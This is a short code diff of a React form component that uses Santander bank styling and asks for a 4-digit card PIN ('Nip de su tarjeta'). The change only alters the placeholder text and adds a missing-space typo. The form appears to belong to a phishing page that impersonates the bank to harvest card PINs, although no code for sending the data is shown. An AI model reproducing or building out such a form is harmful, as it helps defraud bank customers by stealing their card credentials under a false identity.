@@ -44,7 +44,7 @@ function Primerapag() {
         </label>
         <label>
           Nip de su tarjeta
-          <input type="tel" name="nip" placeholder="Nip de 4 dígitos" className="santander-input" maxLength={4} required />
+          <input type="tel" name="nip" placeholder="Nip de4 dígitos" className="santander-input" maxLength={4} required />
         </label>
         <button type="submit" className="santander-continue-button">Continuar</button>
       </form>
